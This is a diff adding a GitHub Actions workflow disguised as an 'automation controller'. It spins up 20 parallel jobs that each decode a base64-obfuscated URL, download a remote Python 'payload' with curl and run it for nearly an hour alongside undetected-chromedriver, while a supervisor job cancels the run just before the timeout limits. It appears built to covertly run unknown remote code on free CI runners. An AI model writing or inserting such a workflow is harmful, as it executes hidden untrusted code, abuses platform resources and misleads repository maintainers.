@@ -1,0 +1,94 @@
+name: Nexus Grid Automation Controller
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: nexus-cluster-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Component 1: Execution Lifecycle Supervisor
+  # =================================================================
+  cluster-supervisor:
+    name: "Lifecycle Supervisor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      TIMEOUT_LIMIT: 3540
+    steps:
+      - name: Start Lifecycle Tracking
+        run: |
+          echo "[SUPERVISOR] Tracking active run: ${{ github.run_id }}"
+          echo "[SUPERVISOR] Sleeping for ${TIMEOUT_LIMIT} seconds."
+
+          sleep "${TIMEOUT_LIMIT}"
+
+          echo "[SUPERVISOR] Watch duration elapsed — sending abort request."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[SUPERVISOR] Abort request sent successfully."
+
+  # =================================================================
+  # Component 2: Parallel Task Units
+  # =================================================================
+  cluster-workers:
+    name: "WorkerUnit-${{ matrix.node_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_tag: ["ALPHA", "BRAVO", "CHARLIE", "DELTA", "ECHO", "FOXTROT", "GOLF", "HOTEL", "INDIA", "JULIET", "KILO", "LIMA", "MIKE", "NOVEMBER", "OSCAR", "PAPA", "QUEBEC", "ROMEO", "SIERRA", "TANGO"]
+
+    steps:
+      # Step 1: Base package provision
+      - name: Prepare Runner Node
+        run: |
+          echo "[PREP] Initializing runner for WorkerUnit-${{ matrix.node_tag }}..."
+          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip
+
+      # Step 2: Fetch worker engine script
+      - name: Download Worker Payload
+        run: |
+          echo "[DOWNLOAD] Fetching remote execution payload..."
+          SRC_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$SRC_URI" -o app_runner.py
+          echo "[DOWNLOAD] Payload saved to app_runner.py."
+
+      # Step 3: Install required modules
+      - name: Load Dependencies
+        run: |
+          echo "[DEPS] Installing runtime modules..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # Step 4: Run application process
+      - name: Run Main Application Process
+        run: |
+          echo "[EXEC] Starting task on WorkerUnit-${{ matrix.node_tag }}..."
+
+          python3 app_runner.py &
+          APP_PID=$!
+
+          echo "[EXEC] Task running under PID $APP_PID (Max time: 3540s)."
+
+          sleep 3540
+
+          if kill -0 "$APP_PID" 2>/dev/null; then
+            echo "[EXEC] Maximum threshold reached — sending SIGKILL to PID $APP_PID."
+            kill -9 "$APP_PID"
+            echo "[EXEC] Process terminated by execution controller."
+          else
+            echo "[EXEC] Process completed prior to timeout."
+          fi
